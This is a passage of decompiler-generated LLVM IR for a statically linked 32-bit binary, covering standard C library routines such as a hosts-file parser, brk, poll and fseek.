  br i1 %v4_8056d3580, label %dec_label_pc_8056d4c, label %dec_label_pc_8056d39

dec_label_pc_8056d2f:                             ; preds = %dec_label_pc_8056d47, %dec_label_pc_8056d39
  store i8 0, i8* %v1_8056d3383, align 1
  %v0_8056d32 = load i32, i32* @ebx, align 4
  %v1_8056d32 = add i32 %v0_8056d32, 1
  store i32 %v1_8056d32, i32* @ebx, align 4
  %v4_8056d33.pre = load i32, i32* @ecx, align 4
  %v1_8056d33 = inttoptr i32 %v1_8056d32 to i8*
  %v2_8056d33 = load i8, i8* %v1_8056d33, align 1
  %v3_8056d33 = zext i8 %v2_8056d33 to i32
  %v5_8056d33 = and i32 %v4_8056d33.pre, -256
  %v6_8056d33 = or i32 %v3_8056d33, %v5_8056d33
  store i32 %v6_8056d33, i32* @ecx, align 4
  %v4_8056d35 = icmp eq i8 %v2_8056d33, 0
  br i1 %v4_8056d35, label %dec_label_pc_8056d4c, label %dec_label_pc_8056d39

dec_label_pc_8056d39:                             ; preds = %dec_label_pc_8056d33.preheader, %dec_label_pc_8056d2f
  %v2_8056d3384 = phi i8 [ %v2_8056d33, %dec_label_pc_8056d2f ], [ %v2_8056d3376, %dec_label_pc_8056d33.preheader ]
  %v1_8056d3383 = phi i8* [ %v1_8056d33, %dec_label_pc_8056d2f ], [ %v1_8056d3375, %dec_label_pc_8056d33.preheader ]
  %v0_8056d5082 = phi i32 [ %v1_8056d32, %dec_label_pc_8056d2f ], [ %v0_8056d13.lcssa, %dec_label_pc_8056d33.preheader ]
  %v0_8056d39 = load i32, i32* @global_var_805c278, align 8
  store i32 %v0_8056d39, i32* @eax, align 4
  %v2_8056d3e = sext i8 %v2_8056d3384 to i32
  store i32 %v2_8056d3e, i32* @edx, align 4
  %v2_8056d41 = mul nsw i32 %v2_8056d3e, 2
  %v3_8056d41 = add i32 %v0_8056d39, %v2_8056d41
  %v4_8056d41 = inttoptr i32 %v3_8056d41 to i8*
  %v5_8056d41 = load i8, i8* %v4_8056d41, align 1
  %v6_8056d41 = and i8 %v5_8056d41, 32
  %v7_8056d41 = icmp eq i8 %v6_8056d41, 0
  %v1_8056d45 = icmp eq i1 %v7_8056d41, false
  br i1 %v1_8056d45, label %dec_label_pc_8056d2f, label %dec_label_pc_8056d47

dec_label_pc_8056d47:                             ; preds = %dec_label_pc_8056d39
  %v10_8056d47 = icmp eq i8 %v2_8056d3384, 10
  br i1 %v10_8056d47, label %dec_label_pc_8056d2f, label %dec_label_pc_8056d4c

dec_label_pc_8056d4c:                             ; preds = %dec_label_pc_8056d2f, %dec_label_pc_8056d47, %dec_label_pc_8056d33.preheader
  %v0_8056d50.lcssa = phi i32 [ %v0_8056d13.lcssa, %dec_label_pc_8056d33.preheader ], [ %v0_8056d5082, %dec_label_pc_8056d47 ], [ %v1_8056d32, %dec_label_pc_8056d2f ]
  %v1_8056d33.lcssa = phi i8* [ %v1_8056d3375, %dec_label_pc_8056d33.preheader ], [ %v1_8056d3383, %dec_label_pc_8056d47 ], [ %v1_8056d33, %dec_label_pc_8056d2f ]
  %v4_8056d4c = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_8056d50 = load i8, i8* %v1_8056d33.lcssa, align 1
  %v3_8056d50 = icmp eq i8 %v2_8056d50, 0
  br i1 %v3_8056d50, label %dec_label_pc_8056d5c, label %dec_label_pc_8056d55

dec_label_pc_8056d55:                             ; preds = %dec_label_pc_8056d50.preheader, %dec_label_pc_8056d4c
  %v0_8056d0a = phi i32 [ %v0_8056d50.lcssa, %dec_label_pc_8056d4c ], [ %v0_8056cd256, %dec_label_pc_8056d50.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_8056d4c, %dec_label_pc_8056d4c ], [ 0, %dec_label_pc_8056d50.preheader ]
  %v7_8056d5a = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_8056d5a, label %dec_label_pc_8056d5c, label %dec_label_pc_8056d06

dec_label_pc_8056d5c:                             ; preds = %dec_label_pc_8056d4c, %dec_label_pc_8056d55, %dec_label_pc_8056d50.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8056d50.preheader ], [ %v4_8056d4c, %dec_label_pc_8056d4c ], [ %stack_var_-196.013, %dec_label_pc_8056d55 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8056d63 = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805b507.566 to i32), i32* %stack_var_-216, align 4
  %v5_8056d70 = call i32 @__GI_strcoll(i8* %v4_8056d70, i32 ptrtoint ([11 x i8]* @global_var_805b507.566 to i32), i32 %v0_8056d63, i32 %v0_8056d63)
  store i32 %v5_8056d70, i32* @eax, align 4
  %v1_8056d78 = icmp eq i32 %v5_8056d70, 0
  br i1 %v1_8056d78, label %dec_label_pc_8056da0.preheader, label %dec_label_pc_8056db1

dec_label_pc_8056da0.preheader:                   ; preds = %dec_label_pc_8056d5c
  %v0_8056da089 = load i32, i32* @esi, align 4
  %v5_8056da498 = icmp slt i32 %v0_8056da089, %stack_var_-196.0.lcssa
  br i1 %v5_8056da498, label %dec_label_pc_8056da6.lr.ph, label %dec_label_pc_8056db1

dec_label_pc_8056da6.lr.ph:                       ; preds = %dec_label_pc_8056da0.preheader
  %v0_8056da6.pre = load i32, i32* @global_var_8062bd4.498, align 4
  br label %dec_label_pc_8056da6

dec_label_pc_8056d7e:                             ; preds = %dec_label_pc_8056da6
  %v2_8056d81 = mul i32 %v0_8056da099, 4
  %v4_8056d81 = add i32 %v2_8056d81, %v3_8056d81
  %v5_8056d81 = inttoptr i32 %v4_8056d81 to i32*
  %v6_8056d81 = load i32, i32* %v5_8056d81, align 4
  %v1_8056d88 = add i32 %v0_8056da099, 1
  store i32 %v1_8056d88, i32* @esi, align 4
  %v1_8056d89 = inttoptr i32 %v6_8056d81 to i8*
  %v2_8056d89 = call i32 @__GI_strdup(i8* %v1_8056d89)
  %v1_8056d91 = load i32, i32* @ebx, align 4
  %v2_8056d91 = mul i32 %v1_8056d91, 4
  %v3_8056d91 = add i32 %v2_8056d91, 134622152
  %v4_8056d91 = inttoptr i32 %v3_8056d91 to i32*
  store i32 %v2_8056d89, i32* %v4_8056d91, align 4
  %v0_8056d98 = load i32, i32* @ebx, align 4
  %v1_8056d98 = add i32 %v0_8056d98, 1
  store i32 %v1_8056d98, i32* @eax, align 4
  store i32 %v1_8056d98, i32* @global_var_8062bd4.498, align 4
  %v0_8056da0 = load i32, i32* @esi, align 4
  %v5_8056da4 = icmp slt i32 %v0_8056da0, %stack_var_-196.0.lcssa
  br i1 %v5_8056da4, label %dec_label_pc_8056da6, label %dec_label_pc_8056db1

dec_label_pc_8056da6:                             ; preds = %dec_label_pc_8056da6.lr.ph, %dec_label_pc_8056d7e
  %v0_8056da6 = phi i32 [ %v0_8056da6.pre, %dec_label_pc_8056da6.lr.ph ], [ %v1_8056d98, %dec_label_pc_8056d7e ]
  %v0_8056da099 = phi i32 [ %v0_8056da089, %dec_label_pc_8056da6.lr.ph ], [ %v0_8056da0, %dec_label_pc_8056d7e ]
  store i32 %v0_8056da6, i32* @ebx, align 4
  %v7_8056daf = icmp sgt i32 %v0_8056da6, 2
  br i1 %v7_8056daf, label %dec_label_pc_8056db1, label %dec_label_pc_8056d7e

dec_label_pc_8056db1:                             ; preds = %dec_label_pc_8056da0.preheader, %dec_label_pc_8056d7e, %dec_label_pc_8056da6, %dec_label_pc_8056d5c
  %v0_8056db1 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805b512.567 to i32), i32* %stack_var_-216, align 4
  %v0_8056db8 = load i32, i32* @edi, align 4
  %v4_8056db9 = inttoptr i32 %v0_8056db8 to i8*
  %v5_8056db9 = call i32 @__GI_strcoll(i8* %v4_8056db9, i32 ptrtoint ([7 x i8]* @global_var_805b512.567 to i32), i32 %v0_8056db1, i32 %v0_8056db1)
  store i32 %v5_8056db9, i32* @eax, align 4
  %v1_8056dc1 = icmp eq i32 %v5_8056db9, 0
  br i1 %v1_8056dc1, label %dec_label_pc_8056e03.preheader, label %dec_label_pc_8056dc5

dec_label_pc_8056dc5:                             ; preds = %dec_label_pc_8056db1
  %v0_8056dc5 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805b519.568 to i32), i32* %stack_var_-216, align 4
  %v0_8056dcc = load i32, i32* @edi, align 4
  %v4_8056dcd = inttoptr i32 %v0_8056dcc to i8*
  %v5_8056dcd = call i32 @__GI_strcoll(i8* %v4_8056dcd, i32 ptrtoint ([7 x i8]* @global_var_805b519.568 to i32), i32 %v0_8056dc5, i32 %v0_8056dc5)
  %v1_8056dd5 = icmp eq i32 %v5_8056dcd, 0
  br i1 %v1_8056dd5, label %dec_label_pc_8056e03.preheader, label %dec_label_pc_8056e46

dec_label_pc_8056e03.preheader:                   ; preds = %dec_label_pc_8056db1, %dec_label_pc_8056dc5
  %v0_8056e03100 = load i32, i32* @global_var_8062bd8.561, align 8
  %tmp43103 = icmp slt i32 %v0_8056e03100, 1
  %tmp44104 = icmp eq i1 %tmp43103, false
  br i1 %tmp44104, label %dec_label_pc_8056ddb, label %dec_label_pc_8056e0c

dec_label_pc_8056ddb:                             ; preds = %dec_label_pc_8056e03.preheader, %dec_label_pc_8056ddb.dec_label_pc_8056ddb_crit_edge
  %v0_8056e03105 = phi i32 [ %v0_8056e03, %dec_label_pc_8056ddb.dec_label_pc_8056ddb_crit_edge ], [ %v0_8056e03100, %dec_label_pc_8056e03.preheader ]
  %v1_8056ddb = add i32 %v0_8056e03105, -1
  %v1_8056ddf = mul i32 %v1_8056ddb, 4
  %v2_8056ddf = add i32 %v1_8056ddf, 134622136
  %v3_8056ddf = inttoptr i32 %v2_8056ddf to i32*
  %v4_8056ddf = load i32, i32* %v3_8056ddf, align 4
  store i32 %v1_8056ddb, i32* @global_var_8062bd8.561, align 8
  %v1_8056deb = call i32 @free(i32 %v4_8056ddf)
  %v0_8056df0 = load i32, i32* @global_var_8062bd8.561, align 8
  %v1_8056df8 = mul i32 %v0_8056df0, 4
  %v2_8056df8 = add i32 %v1_8056df8, ptrtoint (i32* @global_var_8062bb8.569 to i32)
  %v3_8056df8 = inttoptr i32 %v2_8056df8 to i32*
  store i32 0, i32* %v3_8056df8, align 4
  %v0_8056e03 = load i32, i32* @global_var_8062bd8.561, align 8
  %tmp43 = icmp slt i32 %v0_8056e03, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_8056ddb.dec_label_pc_8056ddb_crit_edge, label %dec_label_pc_8056e0c

dec_label_pc_8056ddb.dec_label_pc_8056ddb_crit_edge: ; preds = %dec_label_pc_8056ddb
  br label %dec_label_pc_8056ddb

dec_label_pc_8056e0c:                             ; preds = %dec_label_pc_8056ddb, %dec_label_pc_8056e03.preheader
  %v0_8056e03.lcssa = phi i32 [ %v0_8056e03100, %dec_label_pc_8056e03.preheader ], [ %v0_8056e03, %dec_label_pc_8056ddb ]
  store i32 1, i32* @esi, align 4
  %v5_8056e39115 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8056e39115, label %dec_label_pc_8056e3b, label %dec_label_pc_8056e46

dec_label_pc_8056e13:                             ; preds = %dec_label_pc_8056e3b
  %v2_8056e16 = mul i32 %v0_8056e1d117, 4
  %v4_8056e16 = add i32 %v2_8056e16, %v3_8056d81
  %v5_8056e16 = inttoptr i32 %v4_8056e16 to i32*
  %v6_8056e16 = load i32, i32* %v5_8056e16, align 4
  %v1_8056e1d = add i32 %v0_8056e1d117, 1
  store i32 %v1_8056e1d, i32* @esi, align 4
  %v1_8056e1e = inttoptr i32 %v6_8056e16 to i8*
  %v2_8056e1e = call i32 @__GI_strdup(i8* %v1_8056e1e)
  %v1_8056e26 = load i32, i32* @ebx, align 4
  %v2_8056e26 = mul i32 %v1_8056e26, 4
  %v3_8056e26 = add i32 %v2_8056e26, 134622136
  %v4_8056e26 = inttoptr i32 %v3_8056e26 to i32*
  store i32 %v2_8056e1e, i32* %v4_8056e26, align 4
  %v0_8056e2d = load i32, i32* @ebx, align 4
  %v1_8056e2d = add i32 %v0_8056e2d, 1
  store i32 %v1_8056e2d, i32* @global_var_8062bd8.561, align 8
  %v0_8056e35.pre = load i32, i32* @esi, align 4
  %v5_8056e39 = icmp slt i32 %v0_8056e35.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8056e39, label %dec_label_pc_8056e3b, label %dec_label_pc_8056e46

dec_label_pc_8056e3b:                             ; preds = %dec_label_pc_8056e0c, %dec_label_pc_8056e13
  %v0_8056e1d117 = phi i32 [ %v0_8056e35.pre, %dec_label_pc_8056e13 ], [ 1, %dec_label_pc_8056e0c ]
  %v0_8056e3b116 = phi i32 [ %v1_8056e2d, %dec_label_pc_8056e13 ], [ %v0_8056e03.lcssa, %dec_label_pc_8056e0c ]
  store i32 %v0_8056e3b116, i32* @ebx, align 4
  %v7_8056e44 = icmp sgt i32 %v0_8056e3b116, 3
  br i1 %v7_8056e44, label %dec_label_pc_8056e46, label %dec_label_pc_8056e13

dec_label_pc_8056e46:                             ; preds = %dec_label_pc_8056cd3.preheader, %dec_label_pc_8056cd2, %dec_label_pc_8056e0c, %dec_label_pc_8056e3b, %dec_label_pc_8056e13, %dec_label_pc_8056dc5, %dec_label_pc_8056cf4, %dec_label_pc_8056ceb, %dec_label_pc_8056e46.preheader
  %v0_8056e46 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8056e4d, i32* @ebx, align 4
  %v3_8056e52 = call i32 @fgets(i32 %v2_8056e4d, i32 128, i32 %v0_8056e46)
  store i32 %v3_8056e52, i32* @eax, align 4
  %v1_8056e5a = icmp eq i32 %v3_8056e52, 0
  %v1_8056e5c = icmp eq i1 %v1_8056e5a, false
  br i1 %v1_8056e5c, label %dec_label_pc_8056cd3.preheader, label %dec_label_pc_8056e62

dec_label_pc_8056cd3.preheader:                   ; preds = %dec_label_pc_8056e46
  %v0_8056cd3.pre = load i32, i32* @ebx, align 4
  %v4_8056cd3.pre = load i32, i32* @ecx, align 4
  %v1_8056cd349 = inttoptr i32 %v0_8056cd3.pre to i8*
  %v2_8056cd350 = load i8, i8* %v1_8056cd349, align 1
  %v3_8056cd351 = zext i8 %v2_8056cd350 to i32
  %v5_8056cd352 = and i32 %v4_8056cd3.pre, -256
  %v6_8056cd353 = or i32 %v3_8056cd351, %v5_8056cd352
  store i32 %v6_8056cd353, i32* @ecx, align 4
  %v4_8056cd554 = icmp eq i8 %v2_8056cd350, 0
  br i1 %v4_8056cd554, label %dec_label_pc_8056e46, label %dec_label_pc_8056cdd.lr.ph

dec_label_pc_8056cdd.lr.ph:                       ; preds = %dec_label_pc_8056cd3.preheader
  %v0_8056cdd.pre = load i32, i32* @global_var_805c278, align 8
  br label %dec_label_pc_8056cdd

dec_label_pc_8056e62:                             ; preds = %dec_label_pc_8056e46
  %v0_8056e65 = load i32, i32* @ebp, align 4
  %v1_8056e66 = inttoptr i32 %v0_8056e65 to i16*
  %v2_8056e66 = call i32 @__GI_fclose(i16* %v1_8056e66)
  br label %dec_label_pc_8056e7b

dec_label_pc_8056e70:                             ; preds = %dec_label_pc_8056caf
  %v0_8056e70 = call i32 @__GI___h_errno_location()
  %v1_8056e75 = inttoptr i32 %v0_8056e70 to i32*
  store i32 3, i32* %v1_8056e75, align 4
  br label %dec_label_pc_8056e7b

dec_label_pc_8056e7b:                             ; preds = %entry, %dec_label_pc_8056e62, %dec_label_pc_8056e70
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_8056c68, i32* @eax, align 4
  %v2_8056e87 = call i32 @__pthread_return_void(i32 %v2_8056c68, i32 1)
  store i32 %v0_8056c54, i32* @ebp, align 4
  ret i32 %v2_8056e87

; uselistorder directives
  uselistorder i32 %v0_8056cdd.pre, { 1, 0 }
  uselistorder i32 %v6_8056cd353, { 1, 0 }
  uselistorder i8 %v2_8056cd350, { 1, 2, 0 }
  uselistorder i8* %v1_8056cd349, { 1, 0 }
  uselistorder i32 %v0_8056cd3.pre, { 1, 0 }
  uselistorder i32 %v0_8056e03, { 0, 2, 1 }
  uselistorder i32 %v0_8056da6, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8056d3e, { 1, 0 }
  uselistorder i32 %v2_8056d1f, { 1, 0 }
  uselistorder i32 %v1_8056d13, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8056ce2, { 1, 0 }
  uselistorder i32 %v1_8056cd2, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 22, 19, 18, 17, 16, 15, 14, 13, 6, 5, 4, 3, 1, 12, 11, 10, 9, 8, 21, 20, 23, 26, 25, 24, 7, 2, 0 }
  uselistorder i32* @global_var_8062bd8.561, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 2, 1, 3, 4, 0 }
  uselistorder i8 10, { 0, 1, 2, 14, 3, 4, 5, 6, 15, 13, 7, 16, 8, 17, 9, 10, 11, 12, 18 }
  uselistorder i32 164, { 2, 1, 0 }
  uselistorder i32* @global_var_8062bd4.498, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805c4e8.497 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_8056e7b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056e46, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_8056e3b, { 1, 0 }
  uselistorder label %dec_label_pc_8056ddb, { 1, 0 }
  uselistorder label %dec_label_pc_8056e03.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8056db1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8056da6, { 1, 0 }
  uselistorder label %dec_label_pc_8056d5c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056d55, { 1, 0 }
  uselistorder label %dec_label_pc_8056d4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056d39, { 1, 0 }
  uselistorder label %dec_label_pc_8056d1a, { 1, 0 }
  uselistorder label %dec_label_pc_8056e46.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_8056ebb = inttoptr i32 %arg3 to i32*
  %v10_8056ebb = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8056ebb, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8056ebb
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8056ec7 = call i32 @__libc_getpid()
  %v2_8056ed3 = call i32 @kill(i32 %v0_8056ec7, i32 %arg1)
  ret i32 %v2_8056ed3

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_8056edc = load i32, i32* @eax, align 4
  %v1_8056edc = add i32 %v0_8056edc, 28
  %v2_8056edc = inttoptr i32 %v1_8056edc to i32*
  %v3_8056edc = load i32, i32* %v2_8056edc, align 4
  store i32 %v3_8056edc, i32* @global_var_8062bdc.570, align 4
  %v1_8056ee5 = add i32 %v0_8056edc, 44
  %v2_8056ee5 = inttoptr i32 %v1_8056ee5 to i32*
  %v3_8056ee5 = load i32, i32* %v2_8056ee5, align 4
  store i32 %v3_8056ee5, i32* @global_var_8062be0.571, align 32
  ret i32 %v3_8056ee5
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8056ef0 = load i32, i32* @ebx, align 4
  store i32 %v0_8056ef0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8056f03 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8056f03, i32* @global_var_80627a4.548, align 4
  %v7_8056f0e = icmp ult i32 %v1_8056f03, %arg1
  %v1_8056f10 = icmp eq i1 %v7_8056f0e, false
  br i1 %v1_8056f10, label %dec_label_pc_8056f20, label %dec_label_pc_8056f12

dec_label_pc_8056f12:                             ; preds = %entry
  %v0_8056f12 = load i32, i32* %stack_var_-4, align 4
  %v1_8056f12 = call i32 @__errno_location(i32 %v0_8056f12)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8056f1a = inttoptr i32 %v1_8056f12 to i32*
  store i32 12, i32* %v1_8056f1a, align 4
  %v0_8056f21.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8056f20

dec_label_pc_8056f20:                             ; preds = %entry, %dec_label_pc_8056f12
  %v0_8056f21 = phi i32 [ 0, %entry ], [ %v0_8056f21.pre, %dec_label_pc_8056f12 ]
  %v2_8056f24 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056f24, i32* @ebx, align 4
  ret i32 %v0_8056f21

; uselistorder directives
  uselistorder i32 %v1_8056f03, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_80627a4.548, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056f20, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8056f28 = load i32, i32* @edi, align 4
  store i32 %v0_8056f28, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_8056f38 = load i32, i32* @ebx, align 4
  %v1_8056f39 = inttoptr i32 %tmp4 to %pollfd*
  %v5_8056f40 = call i32 @poll(%pollfd* %v1_8056f39, i32 %tmp3, i32 %tmp)
  store i32 %v0_8056f38, i32* @ebx, align 4
  store i32 %v5_8056f40, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_8056f40, -4095
  br i1 %tmp10, label %dec_label_pc_8056f58, label %dec_label_pc_8056f4c

dec_label_pc_8056f4c:                             ; preds = %entry
  %v1_8056f4c = call i32 @__errno_location(i32 %v0_8056f38)
  %v0_8056f51 = load i32, i32* %edi.global-to-local, align 4
  %v1_8056f51 = sub i32 0, %v0_8056f51
  %v2_8056f53 = inttoptr i32 %v1_8056f4c to i32*
  store i32 %v1_8056f51, i32* %v2_8056f53, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8056f58

dec_label_pc_8056f58:                             ; preds = %entry, %dec_label_pc_8056f4c
  %v0_8056f59 = phi i32 [ %v5_8056f40, %entry ], [ -1, %dec_label_pc_8056f4c ]
  %v2_8056f5c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056f5c, i32* @edi, align 4
  ret i32 %v0_8056f59

; uselistorder directives
  uselistorder i32 %v5_8056f40, { 1, 0, 2 }
  uselistorder i32 %v0_8056f38, { 1, 0 }
  uselistorder label %dec_label_pc_8056f58, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8056f6b = ashr i32 %arg2, 31
  %v4_8056f72 = inttoptr i32 %arg1 to i16*
  %v5_8056f72 = call i32 @__GI_fseeko64(i16* %v4_8056f72, i32 %arg2, i32 %v1_8056f6b, i32 %arg3)
  ret i32 %v5_8056f72
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8056f7c = load i32, i32* @ebp, align 4
  %v0_8056f7d = load i32, i32* @edi, align 4
  %v0_8056f7e = load i32, i32* @esi, align 4
  %v0_8056f7f = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8056f8f = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056f8f, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_8056fb3, label %dec_label_pc_8056fa0

dec_label_pc_8056fa0:                             ; preds = %entry
  %v1_8056fa0 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8056fa0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_8056fa8 = inttoptr i32 %v1_8056fa0 to i32*
  store i32 22, i32* %v1_8056fa8, align 4
  br label %dec_label_pc_8057059

dec_label_pc_8056fb3:                             ; preds = %entry
  %v1_8056fb3 = add i32 %v4_8056f8f, 52
  %v2_8056fb3 = inttoptr i32 %v1_8056fb3 to i32*
  %v3_8056fb3 = load i32, i32* %v2_8056fb3, align 4
  %v1_8056fb6 = icmp eq i32 %v3_8056fb3, 0
  %v1_8056fb8 = icmp eq i1 %v1_8056fb6, false
  br i1 %v1_8056fb8, label %dec_label_pc_8056fd9, label %dec_label_pc_8056fba

dec_label_pc_8056fba:                             ; preds = %dec_label_pc_8056fb3
  %v1_8056fba = add i32 %v4_8056f8f, 56
  store i32 %v1_8056fba, i32* @ebx, align 4
  %v2_8056fc4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8056fc4, i32* @eax, align 4
  %v3_8056fc9 = call i32 @__pthread_return_void(i32 %v2_8056fc4, i32 134566343)
  store i32 %v3_8056fc9, i32* %eax.global-to-local, align 4
  %v0_8056fce = load i32, i32* @ebx, align 4
  %v2_8056fd1 = call i32 @__pthread_return_0(i32 %v0_8056fce)
  store i32 %v2_8056fd1, i32* %eax.global-to-local, align 4
  %v0_8056fd9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056fd9

dec_label_pc_8056fd9:                             ; preds = %dec_label_pc_8056fb3, %dec_label_pc_8056fba
  %v0_8056fe1 = phi i32 [ %v4_8056f8f, %dec_label_pc_8056fb3 ], [ %v0_8056fd9.pre, %dec_label_pc_8056fba ]
  %v1_8056fd9 = inttoptr i32 %v0_8056fe1 to i8*
  %v2_8056fd9 = load i8, i8* %v1_8056fd9, align 1
  %v3_8056fd9 = and i8 %v2_8056fd9, 64
  %v4_8056fd9 = icmp eq i8 %v3_8056fd9, 0
  br i1 %v4_8056fd9, label %dec_label_pc_8056fee, label %dec_label_pc_8056fde

dec_label_pc_8056fde:                             ; preds = %dec_label_pc_8056fd9
  %v2_8056fe2 = call i32 @__stdio_wcommit(i32 %v0_8056fe1)
  store i32 %v2_8056fe2, i32* %eax.global-to-local, align 4
  %v1_8056fea = icmp eq i32 %v2_8056fe2, 0
  %v1_8056fec = icmp eq i1 %v1_8056fea, false
  br i1 %v1_8056fec, label %dec_label_pc_8057041, label %dec_label_pc_8056fee

dec_label_pc_8056fee:                             ; preds = %dec_label_pc_8056fde, %dec_label_pc_8056fd9
  %v0_8056fee = load i32, i32* @edi, align 4
  %v9_8056fee = icmp eq i32 %v0_8056fee, 1
  %v1_8056ff1 = icmp eq i1 %v9_8056fee, false
  br i1 %v1_8056ff1, label %dec_label_pc_8056fee.dec_label_pc_8057007_crit_edge, label %dec_label_pc_8056ff3

dec_label_pc_8056fee.dec_label_pc_8057007_crit_edge: ; preds = %dec_label_pc_8056fee
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8057007

dec_label_pc_8056ff3:                             ; preds = %dec_label_pc_8056fee
  %v0_8056ff3 = load i32, i32* @ecx, align 4
  %v2_8056ff5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8056ff5, i32* %eax.global-to-local, align 4
  %v0_8056ffa = load i32, i32* @esi, align 4
  %v5_8056ffa = inttoptr i32 %v0_8056ffa to i16*
  %v6_8056ffb = call i32 @__stdio_adjust_position(i16* %v5_8056ffa, i32 %v2_8056ff5, i32 %v0_8056ff3, i32 %v0_8056ff3)
  store i32 %v6_8056ffb, i32* %eax.global-to-local, align 4
  %v2_8057003 = icmp slt i32 %v6_8056ffb, 0
  br i1 %v2_8057003, label %dec_label_pc_8057041, label %dec_label_pc_8056ff3.dec_label_pc_8057007_crit_edge

dec_label_pc_8056ff3.dec_label_pc_8057007_crit_edge: ; preds = %dec_label_pc_8056ff3
  %v0_8057008.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057007

dec_label_pc_8057007:                             ; preds = %dec_label_pc_8056fee.dec_label_pc_8057007_crit_edge, %dec_label_pc_8056ff3.dec_label_pc_8057007_crit_edge
  %v2_8057009.pre-phi = phi i32 [ %.pre6, %dec_label_pc_8056fee.dec_label_pc_8057007_crit_edge ], [ %v2_8056ff5, %dec_label_pc_8056ff3.dec_label_pc_8057007_crit_edge ]
